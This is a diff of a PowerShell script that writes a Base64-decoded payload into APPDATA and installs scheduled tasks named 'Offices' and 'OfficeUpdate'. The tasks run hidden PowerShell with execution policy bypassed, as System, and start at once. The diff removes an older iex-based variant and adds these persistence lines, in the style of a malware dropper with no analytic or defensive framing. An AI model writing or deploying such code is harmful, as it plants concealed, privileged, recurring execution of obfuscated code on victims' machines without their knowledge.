@@ -1,3 +1,4 @@
+
 $filepath1 = $env:APPDATA + "\settings.in"
 $filepath2 = $env:APPDATA + "\stunck.in"
 Remove-Item -path $filepath1 -Force
@@ -11,10 +12,8 @@ $res  = [System.Convert]::FromBase64String("JGxza2QgPSBHZXQtQ2hpbGRJdGVtIC1QYXRo
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath2
 
-$ws = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -command {gc $filepath1|iex}"
-$ws1 = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -command {gc $filepath2|iex}"
-schtasks.exe /create /SC DAILY /MO 1 /ST 10:20 /TN "Offices" /TR $ws  /F
-schtasks.exe /create /SC DAILY /MO 2 /ST 11:20 /TN "OfficeUpdate" /TR $ws1  /F
+schtasks /create /tn "Offices" /tr "powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File \"$filepath1\"" /sc DAILY /st 09:00 /ru System
+schtasks /create /tn "OfficeUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File \"$filepath2\"" /sc DAILY /st 09:00 /ru System
 
 schtasks /run /tn "Offices"
 schtasks /run /tn "OfficeUpdate"
